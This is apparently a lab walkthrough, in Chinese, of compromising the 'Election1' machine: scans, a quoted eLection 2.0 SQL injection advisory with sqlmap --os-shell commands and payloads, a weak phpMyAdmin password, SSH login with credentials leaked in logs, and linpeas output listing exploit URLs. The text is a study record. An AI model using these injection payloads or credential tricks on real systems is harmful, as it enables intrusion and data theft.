# Election1

```
┌──(root💀Chinchin)-[~/桌面]
└─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.213.211
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 21:50 CST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.66% done; ETC: 21:50 (0:00:00 remaining)
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 3.28% done; ETC: 21:50 (0:00:00 remaining)
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 4.18% done; ETC: 21:50 (0:00:00 remaining)
Nmap scan report for 192.168.213.211
Host is up (0.29s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20d1ed84cc68a5a786f0dab8923fd967 (RSA)
|   256 7889b3a2751276922af98d27c108a7b9 (ECDSA)
|_  256 b8f4d661cf1690c5071899b07c70fdc0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/15%OT=22%CT=1%CU=43591%PV=Y%DS=4%DC=T%G=Y%TM=646238E
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%TS=C)SEQ(SP=108%GC
OS:D=1%ISR=10A%TI=Z%II=I%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT1
OS:1NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE
OS:88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=
OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=16
OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=9784%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   274.18 ms 192.168.45.1
2   274.21 ms 192.168.45.254
3   276.92 ms 192.168.251.1
4   277.04 ms 192.168.213.211

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.84 seconds

```

```
gobuster dir --url http://192.168.213.211/ -w /usr/share/wordlists//dirbuster/directory-list-lowercase-2.3-medium.txt -k -r -x -e php,cgi,txt,log,conf 
/election             (Status: 200) [Size: 7003]
/phpmyadmin           (Status: 200) [Size: 10531]

```

查看phpmyadmin版本

```
http://192.168.213.211/phpmyadmin//doc/html/index.html
```

phpmyadmin的版本为4.6.6，没有什么漏洞。好像努力错方向了，选择大于努力，换一个选择。

```
──(root💀Chinchin)-[~/桌面]
└─# searchsploit election 
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
Adobe Flash - Selection.setFocus Use-After-Free                                       | multiple/dos/40307.txt
Adobe Flash Selection.SetSelection - Use-After-Free                                   | windows_x86-64/dos/39043.txt
eLection 2.0 - 'id' SQL Injection                                                     | php/webapps/48122.txt
Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86 | linux_x86-64/local/9083.c
Microsoft Internet Explorer 9 - IEFRAME CSelection­Interact­Button­Behavior::_Upda | windows/dos/40907.html
Microsoft Windows Server 2003 - AD BROWSER ELECTION Remote Heap Overflow              | windows/dos/16166.py
SunView (SunOS 4.1.1) - 'selection_svc' Remote File Read                              | solaris/remote/19040.txt
-------------------------------------------------------------------------------------- ---------------------------------

```

```
# Title: eLection 2.0 - 'id' SQL Injection
# Date: 2020-02-21
# Exploit Author: J3rryBl4nks
# Vendor Homepage: https://sourceforge.net/projects/election-by-tripath/
# Software Link: https://sourceforge.net/projects/election-by-tripath/files/#Version 2.0
# Tested on Ubuntu 19/Kali Rolling

# The eLection Web application is vulnerable to authenticated SQL Injection which leads to remote code execution:
# Login to the admin portal and browse to the candidates section. Capture the request in BurpSuite and save it to file:

POST /election/admin/ajax/op_kandidat.php HTTP/1.1
Host: HOSTNAME
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://HOSTNAME/election/admin/kandidat.php?_
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 17
Connection: close
Cookie: el_listing_panitia=5; el_mass_adding=false; el_listing_guru=5; el_listing_siswa=5; PHPSESSID=b4f0c3bbccd80e9d55fbe0269a29f96a; el_lang=en-us

aksi=fetch&id=256



Send the request to SQLMap with the following parameters:

    sqlmap -r getcandidate --level=5 --risk=3 --os-shell -p id


SQLMap will find the injection:

    ---
    Parameter: id (POST)
        Type: boolean-based blind
        Title: AND boolean-based blind - WHERE or HAVING clause
        Payload: aksi=fetch&id=256 AND 8584=8584

        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: aksi=fetch&id=256 AND (SELECT 8551 FROM (SELECT(SLEEP(5)))nYfJ)

        Type: UNION query
        Title: Generic UNION query (NULL) - 5 columns
        Payload: aksi=fetch&id=-9798 UNION ALL SELECT NULL,NULL,CONCAT(0x7170707171,0x676d755461434e486f49475051707357694861534e664f416f434269487042545a76454f5843584b,0x71717a7871),NULL,NULL-- dWMc
    ---


    [09:39:07] [WARNING] unable to automatically parse any web server path
    [09:39:07] [INFO] trying to upload the file stager on '/opt/lampp/htdocs/election/' via LIMIT 'LINES TERMINATED BY' method
    [09:39:07] [INFO] the file stager has been successfully uploaded on '/opt/lampp/htdocs/election/' - http://HOSTNAME/election/tmpumlfm.php
    [09:39:07] [INFO] the backdoor has been successfully uploaded on '/opt/lampp/htdocs/election/' - http://HOSTNAME/election/tmpbpfkq.php
    [09:39:07] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
    os-shell>


Due to the way the setup of the application requires you to change permissions on the directory of the web app, you should be able to get a shell.

https://github.com/J3rryBl4nks/eLection-TriPath-/blob/master/SQLiIntoRCE.md
```

被骗了，跑sqlmap跑了半天都没找到sql注入的点

看了下wp，phpmyadmin存在弱密码

```
root:toor
```

登陆后找到/admin的id和密码

```
1234:Zxc123!@#
```

进入后台，又卡住了，以为是头像上传点的文件上传getshell，上传到文件保存后变为

```
HTTP/1.1 200 OK

Date: Mon, 15 May 2023 15:13:26 GMT

Server: Apache/2.4.29 (Ubuntu)

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate

Pragma: no-cache

Content-Length: 56

Connection: close

Content-Type: text/html; charset=UTF-8



{"code":"200","data":"..\/media\/kandidat\/76.jpg?_IBF"}
```

全是兔子洞真几把的烦

点击view logs

```
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
[2023-05-15 20:32:53] Love has been logged in from Unknown IP on Firefox (Linux).
[2023-05-15 20:35:39] Love changed a candidate photo (ID = 76).
[2023-05-15 20:35:52] Love updated candidate data (ID = 76).
[2023-05-15 20:40:29] [ERROR.CDTPHOTO] Unsupported source file format!
[2023-05-15 20:40:41] [ERROR.CDTPHOTO] Unsupported source file format!
[2023-05-15 20:40:55] [ERROR.CDTPHOTO] Unsupported source file format!
[2023-05-15 20:41:12] Love changed a candidate photo (ID = 76).
[2023-05-15 20:43:27] Love changed a candidate photo (ID = 76).

```

尝试ssh登录

```
love:P@$$w0rd@123
```



```
┌──(root💀Chinchin)-[~/桌面/htb]
└─# ssh love@192.168.213.211 
The authenticity of host '192.168.213.211 (192.168.213.211)' can't be established.
ED25519 key fingerprint is SHA256:z1Xg/pSBrK8rLIMLyeb0L7CS1YL4g7BgCK95moiAYhQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.213.211' (ED25519) to the list of known hosts.
love@192.168.213.211's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-120-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

471 packages can be updated.
358 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Thu Apr  9 23:19:28 2020 from 192.168.1.5
love@election:~$ whoami
love
love@election:~$ id
uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
love@election:~$ uname -a
Linux election 5.4.0-120-generic #136~18.04.1-Ubuntu SMP Fri Jun 10 18:00:44 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
love@election:~$ pwd
/home/love

```

```
love@election:~$ ./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                 
    |---------------------------------------------------------------------------------|                                 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                 
    |         Follow on Twitter         :     @carlospolopm                           |                                 
    |         Respect on HTB            :     SirBroccoli                             |                                 
    |---------------------------------------------------------------------------------|                                 
    |                                 Thank you!                                      |                                 
    \---------------------------------------------------------------------------------/                                 
          linpeas-ng by carlospolop                                                                                     
                                                                                                                        
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                              
                                                                                                                        
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                     
                               ╚═══════════════════╝                                                                    
OS: Linux version 5.4.0-120-generic (buildd@lcy02-amd64-037) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #136~18.04.1-Ubuntu SMP Fri Jun 10 18:00:44 UTC 2022
User & Groups: uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
Hostname: election
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                             
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                                  
                                                                                                                        
                                                                                                                        

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                        
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                      
                              ╚════════════════════╝                                                                    
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                      
Linux version 5.4.0-120-generic (buildd@lcy02-amd64-037) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #136~18.04.1-Ubuntu SMP Fri Jun 10 18:00:44 UTC 2022
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                         
Sudo version 1.8.21p2                                                                                                   


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                 
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                      

╔══════════╣ Date & uptime
Mon May 15 20:52:34 IST 2023                                                                                            
 20:52:34 up  1:35,  1 user,  load average: 1.63, 1.20, 1.07

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                    
sda
sda1

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                               
UUID=41866612-9f0f-4db9-9228-3f8a5729800b /               ext4    errors=remount-ro 0       1                           
/swapfile                                 none            swap    sw              0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                 
HISTFILESIZE=0                                                                                                          
MAIL=/var/mail/love
USER=love
SSH_CLIENT=192.168.45.238 36620 22
LANGUAGE=en_IN:en
SHLVL=1
HOME=/home/love
SSH_TTY=/dev/pts/0
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
LOGNAME=love
_=./linpeas.sh
XDG_SESSION_ID=6
TERM=xterm-256color
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_IN
HISTSIZE=0
SHELL=/bin/bash
PWD=/home/love
SSH_CONNECTION=192.168.45.238 36620 192.168.213.211 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                  
dmesg Not Found                                                                                                         
                                                                                                                        
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                      
[+] [CVE-2021-4034] PwnKit                                                                                              

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2020-9470] Wing FTP Server <= 6.2.5 LPE

   Details: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.php
   Exposure: probable
   Tags: [ ubuntu=18 ]
   Download URL: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.sh
   Comments: Requires an administrator to login via the web interface.

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-12181] Serv-U FTP Server

   Details: https://blog.vastart.dev/2019/06/cve-2019-12181-serv-u-exploit-writeup.html
   Exposure: less probable
   Tags: debian=9
   Download URL: https://raw.githubusercontent.com/guywhataguy/CVE-2019-12181/master/servu-pe-cve-2019-12181.c
   ext-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-12181/SUroot
   Comments: Modified version at 'ext-url' uses bash exec technique, rather than compiling with gcc.

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                 
                                                                                                                        
╔══════════╣ Protections
═╣ AppArmor enabled? .............. /etc/apparmor  /etc/apparmor.d                                                      
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                
═╣ PaX bins present? .............. PaX Not Found                                                                       
═╣ Execshield enabled? ............ Execshield Not Found                                                                
═╣ SELinux enabled? ............... sestatus Not Found                                                                  
═╣ Seccomp enabled? ............... disabled                                                                            
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                        

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                     
                                   ╚═══════════╝                                                                        
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?                                                                                          
╔══════════╣ Container details                                                                                          
═╣ Is this a container? ........... No                                                                                  
═╣ Any running containers? ........ No                                                                                  
                                                                                                                        

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                     
                                     ╚═══════╝                                                                          
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                      
                ╚════════════════════════════════════════════════╝                                                      
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                     
root         1  0.0  0.8 159888  8040 ?        Ss   19:16   0:01 /sbin/init splash                                      
root       276  0.0  1.2 111388 12800 ?        S<s  19:16   0:00 /lib/systemd/systemd-journald
root       327  0.0  0.4  48724  4680 ?        Ss   19:16   0:00 /lib/systemd/systemd-udevd
root       423  0.0  0.5  99444  5396 ?        Ss   19:16   0:00 /usr/bin/VGAuthService
systemd+   424  0.0  0.4  70764  4480 ?        Ss   19:16   0:00 /lib/systemd/systemd-resolved
root       426  0.0  0.5 244228  5912 ?        S<sl 19:16   0:03 /usr/bin/vmtoolsd
root       434  0.0  0.5  70720  5588 ?        Ss   19:16   0:00 /lib/systemd/systemd-logind
syslog     435  0.0  0.3 269328  3092 ?        Ssl  19:16   0:00 /usr/sbin/rsyslogd -n
root       436  0.0  0.3 110512  3048 ?        Ssl  19:16   0:00 /usr/sbin/irqbalance --foreground
message+   438  0.0  0.4  51340  4524 ?        Ss   19:16   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       552  0.0  0.6 502908  6184 ?        Ssl  19:16   0:00 /usr/lib/udisks2/udisksd
root       553  0.0  0.5 177632  5804 ?        Ssl  19:16   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       556  0.0  0.2  45232  2908 ?        Ss   19:16   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root       558  0.0  0.4 434324  4624 ?        Ssl  19:16   0:00 /usr/sbin/ModemManager --filter-policy=strict
avahi      620  0.0  0.0  47072    44 ?        S    19:16   0:00  _ avahi-daemon: chroot helper
root       567  0.0  0.0   4548   728 ?        Ss   19:16   0:00 /usr/sbin/acpid
root       570  0.0  0.3  38424  3088 ?        Ss   19:16   0:00 /usr/sbin/cron -f
root       571  0.0  0.5 294744  5396 ?        Ssl  19:16   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       631  0.0  0.6 292900  6960 ?        Ssl  19:16   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       672  0.0  0.6 194228  6632 ?        Ssl  19:16   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       764  0.0  0.4  72296  4296 ?        Ss   19:16   0:00 /usr/sbin/sshd -D
love      4009  0.0  0.5 110072  5640 ?        S    20:45   0:00      _ sshd: love@pts/0
love      4011  0.0  0.4  29492  4904 pts/0    Ss   20:45   0:00          _ -bash
love      4106  0.0  0.3   5840  3176 pts/0    S+   20:51   0:00              _ /bin/sh ./linpeas.sh
love      7493  0.0  0.1   5840  1424 pts/0    S+   20:52   0:00                  _ /bin/sh ./linpeas.sh
love      7497  0.0  0.3  44792  3768 pts/0    R+   20:52   0:00                  |   _ ps fauxwww
love      7496  0.0  0.1   5840  1424 pts/0    S+   20:52   0:00                  _ /bin/sh ./linpeas.sh
mysql      835  0.0  3.4 678784 34332 ?        Ssl  19:16   0:04 /usr/sbin/mysqld
root       872  0.0  4.1 506688 41240 ?        Ss   19:16   0:00 /usr/sbin/apache2 -k start
www-data  2456  0.0  3.3 522168 33188 ?        S    19:22   0:01  _ /usr/sbin/apache2 -k start
www-data  2999  0.0  3.3 522240 33572 ?        S    19:46   0:01  _ /usr/sbin/apache2 -k start
www-data  3011  0.0  3.1 521784 31016 ?        S    19:46   0:01  _ /usr/sbin/apache2 -k start
www-data  3015  0.0  3.1 522152 31824 ?        S    19:46   0:01  _ /usr/sbin/apache2 -k start
www-data  3039  0.0  3.1 521992 31116 ?        S    19:48   0:01  _ /usr/sbin/apache2 -k start
www-data  3576  0.0  3.2 522160 32904 ?        S    20:24   0:00  _ /usr/sbin/apache2 -k start
www-data  3684  0.0  2.3 509864 23928 ?        S    20:33   0:00  _ /usr/sbin/apache2 -k start
www-data  3850  0.0  2.5 510452 25680 ?        S    20:40   0:00  _ /usr/sbin/apache2 -k start
www-data  3867  0.0  2.3 509796 23760 ?        S    20:42   0:00  _ /usr/sbin/apache2 -k start
www-data  4066  0.0  2.2 509252 22276 ?        S    20:49   0:00  _ /usr/sbin/apache2 -k start
root      1495  0.0  0.1 134220  1504 ?        S    19:17   0:00 VBoxClient --vmsvga
root      1516  0.0  0.6 308056  6096 ?        Ssl  19:17   0:00 /usr/sbin/gdm3
gdm       1543  0.0  0.4 212132  4756 tty1     Ssl+ 19:17   0:00      _ /usr/lib/gdm3/gdm-x-session gnome-session --autostart /usr/share/gdm/greeter/autostart
gdm       1545  0.0  2.0 470308 20756 tty1     Sl+  19:17   0:00          _ /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/121/gdm/Xauthority -background none -noreset -keeptty -verbose 3
gdm       1554  0.0  0.8 558924  8696 tty1     Sl+  19:17   0:00          _ /usr/lib/gnome-session/gnome-session-binary --autostart /usr/share/gdm/greeter/autostart
gdm       1584  0.0 13.1 3417108 131732 tty1   Sl+  19:17   0:04              _ /usr/bin/gnome-shell
gdm       1619  0.0  0.5 361464  5700 tty1     Sl   19:17   0:00              |   _ ibus-daemon --xim --panel disable
gdm       1622  0.0  0.3 280612  3840 tty1     Sl   19:17   0:00              |       _ /usr/lib/ibus/ibus-dconf
gdm       1744  0.0  0.4 204888  4576 tty1     Sl   19:17   0:00              |       _ /usr/lib/ibus/ibus-engine-simple
gdm       1649  0.0  1.1 494536 11480 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-xsettings
gdm       1654  0.0  0.4 278124  4392 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-a11y-settings
gdm       1656  0.0  1.0 343680 10836 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-clipboard
gdm       1664  0.0  1.1 658880 11440 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-color
gdm       1665  0.0  0.8 394880  8112 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-datetime
gdm       1666  0.0  0.4 283736  4556 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-housekeeping
gdm       1669  0.0  1.1 506568 11400 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-keyboard
gdm       1670  0.0  1.2 792972 12196 tty1     Sl+  19:17   0:00              _ /usr/lib/gnome-settings-daemon/gsd-media-keys
